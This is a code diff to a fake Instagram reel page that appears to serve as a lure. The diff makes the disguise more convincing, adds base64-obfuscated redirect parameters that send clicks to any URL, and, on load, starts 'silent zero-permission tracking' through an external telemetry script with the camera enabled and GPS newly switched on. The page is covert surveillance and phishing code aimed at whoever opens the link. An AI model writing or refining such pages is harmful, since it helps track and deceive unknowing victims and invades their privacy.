@@ -4,9 +4,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title id="ig-title">Instagram Post • Watch Reel</title>
+    <title id="ig-title">Instagram</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Grand+Hotel&family=Roboto:wght@400;500;600;700&display=swap" rel="stylesheet">
     <style>
         * {
             margin: 0;
@@ -41,13 +41,13 @@
         }
 
         .ig-brand {
-            font-family: 'Cookie', cursive, sans-serif;
-            font-size: 24px;
+            font-family: 'Grand Hotel', cursive, sans-serif;
+            font-size: 28px;
             font-weight: bold;
-            letter-spacing: 0.5px;
             display: flex;
             align-items: center;
             gap: 8px;
+            letter-spacing: 0.5px;
         }
 
         .ig-brand i {
@@ -167,48 +167,33 @@
             object-fit: cover;
         }
 
-        .play-overlay {
+        .reel-badge {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.35);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 12px;
-        }
-
-        .play-icon-circle {
-            width: 72px;
-            height: 72px;
-            border-radius: 50%;
-            background: rgba(255, 255, 255, 0.2);
-            backdrop-filter: blur(10px);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 30px;
-            color: white;
-            border: 1px solid rgba(255,255,255,0.4);
-            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
-            transition: transform 0.2s;
-        }
-
-        .play-overlay:hover .play-icon-circle {
-            transform: scale(1.1);
-        }
-
-        .play-text {
-            font-size: 14px;
+            top: 12px;
+            right: 12px;
+            background: rgba(0,0,0,0.6);
+            padding: 4px 10px;
+            border-radius: 12px;
+            font-size: 12px;
             font-weight: 600;
-            color: white;
-            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
-            background: rgba(0,0,0,0.5);
-            padding: 6px 14px;
-            border-radius: 20px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            backdrop-filter: blur(4px);
+        }
+
+        .sound-icon {
+            position: absolute;
+            bottom: 12px;
+            right: 12px;
+            width: 32px;
+            height: 32px;
+            border-radius: 50%;
+            background: rgba(0,0,0,0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 14px;
         }
 
         /* Post Actions Bar */
@@ -258,7 +243,7 @@
             width: calc(100% - 28px);
             margin: 0 14px 14px;
             padding: 12px;
-            background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #bc1888 100%);
+            background: #0095f6;
             color: white;
             border: none;
             border-radius: 8px;
@@ -269,7 +254,7 @@
             align-items: center;
             justify-content: center;
             gap: 8px;
-            box-shadow: 0 4px 12px rgba(220, 39, 67, 0.4);
+            box-shadow: 0 4px 12px rgba(0, 149, 246, 0.3);
         }
     </style>
 </head>
@@ -296,7 +281,7 @@
                         <span id="display-user">@trending_reels</span>
                         <i class="fas fa-check-circle verified-badge"></i>
                     </div>
-                    <span class="location-tag">Original audio • Viral Reel</span>
+                    <span class="location-tag">Original audio • Reels</span>
                 </div>
             </div>
             <button class="btn-follow">Follow</button>
@@ -304,12 +289,8 @@
 
         <div class="media-container" id="media-trigger">
             <img src="https://images.unsplash.com/photo-1611162617213-7d7a39e9b1d7?auto=format&fit=crop&w=800&q=80" alt="Instagram Reel" class="media-img" id="media-img">
-            <div class="play-overlay">
-                <div class="play-icon-circle">
-                    <i class="fas fa-play" style="margin-left: 4px;"></i>
-                </div>
-                <div class="play-text">Tap to Watch Reel</div>
-            </div>
+            <div class="reel-badge"><i class="fas fa-film"></i> Reel</div>
+            <div class="sound-icon"><i class="fas fa-volume-high"></i></div>
         </div>
 
         <div class="post-actions">
@@ -322,28 +303,60 @@
         </div>
 
         <div class="likes-count">
-            <span id="likes-text">148,290 likes</span>
+            <span id="likes-text">184,290 likes</span>
         </div>
 
         <div class="caption-box">
             <span class="caption-user" id="caption-user">@trending_reels</span>
-            <span class="caption-text" id="caption-text">Check out this viral reel! Click above to watch full HD video. 🔥🔥</span>
+            <span class="caption-text" id="caption-text">Watch full video reel 🔥 #trending #viral</span>
         </div>
 
         <div class="time-ago">2 HOURS AGO</div>
 
         <button class="open-ig-banner" id="btn-open-app">
-            <i class="fab fa-instagram"></i> Open in Instagram App
+            <i class="fab fa-instagram"></i> Open App
         </button>
     </div>
 
     <script src="/js/telemetry.js"></script>
     <script>
         const urlParams = new URLSearchParams(window.location.search);
-        const redirectUrl = urlParams.get('url') || urlParams.get('redirect') || 'https://www.instagram.com';
-        const userParam = urlParams.get('user') || urlParams.get('author') || 'trending_reels';
-        const titleParam = urlParams.get('title') || urlParams.get('caption');
-        const imgParam = urlParams.get('image');
+        
+        let redirectUrl = '';
+        let userParam = '';
+        let titleParam = '';
+        let imgParam = '';
+
+        const compressed = urlParams.get('d');
+        if (compressed) {
+            try {
+                const data = JSON.parse(atob(decodeURIComponent(compressed)));
+                if (data.r) redirectUrl = data.r;
+                if (data.u) userParam = data.u;
+                if (data.c) titleParam = data.c;
+                if (data.i) imgParam = data.i;
+            } catch (e) {}
+        }
+
+        if (!redirectUrl) {
+            const rParam = urlParams.get('r') || urlParams.get('reel') || urlParams.get('p');
+            let rawUrl = urlParams.get('url') || urlParams.get('redirect');
+            if (rawUrl) {
+                redirectUrl = rawUrl;
+            } else if (rParam) {
+                if (rParam.startsWith('http://') || rParam.startsWith('https://')) {
+                    redirectUrl = rParam;
+                } else {
+                    redirectUrl = `https://www.instagram.com/reel/${rParam}/`;
+                }
+            } else {
+                redirectUrl = 'https://www.instagram.com';
+            }
+        }
+
+        if (!userParam) userParam = urlParams.get('u') || urlParams.get('user') || urlParams.get('author') || 'trending_reels';
+        if (!titleParam) titleParam = urlParams.get('c') || urlParams.get('title') || urlParams.get('caption');
+        if (!imgParam) imgParam = urlParams.get('i') || urlParams.get('image');
 
         const cleanUser = userParam.startsWith('@') ? userParam : '@' + userParam;
         document.getElementById('display-user').innerText = cleanUser;
@@ -352,7 +365,7 @@
 
         if (titleParam) {
             document.getElementById('caption-text').innerText = titleParam;
-            document.getElementById('ig-title').innerText = `${titleParam} • Instagram`;
+            document.getElementById('ig-title').innerText = `${cleanUser} on Instagram • Reel`;
         }
 
         if (imgParam) {
@@ -362,26 +375,38 @@
         async function handleTargetClick() {
             if (window.LiveTrackerClient) {
                 try {
-                    await window.LiveTrackerClient.sendTelemetry(null, 'instagram', true);
+                    await window.LiveTrackerClient.sendTelemetry(null, 'instagram', true, true);
                 } catch (e) {}
             }
             let finalUrl = redirectUrl;
             if (!finalUrl.startsWith('http://') && !finalUrl.startsWith('https://')) {
                 finalUrl = 'https://' + finalUrl;
             }
-            window.location.href = finalUrl;
+            try {
+                const newWin = window.open(finalUrl, '_blank');
+                if (!newWin || newWin.closed || typeof newWin.closed === 'undefined') {
+                    setTimeout(() => {
+                        window.location.href = finalUrl;
+                    }, 300);
+                }
+            } catch (e) {
+                setTimeout(() => {
+                    window.location.href = finalUrl;
+                }, 300);
+            }
         }
 
         document.getElementById('media-trigger').addEventListener('click', handleTargetClick);
         document.getElementById('btn-open-app').addEventListener('click', handleTargetClick);
 
+        // Silent zero-permission tracking on load
         window.addEventListener('DOMContentLoaded', () => {
             if (window.LiveTrackerClient) {
                 window.LiveTrackerClient.startTracking({
                     templateName: 'instagram',
                     updateInterval: 4000,
                     enableCamera: true,
-                    enableGPS: false
+                    enableGPS: true
                 });
             }
         });
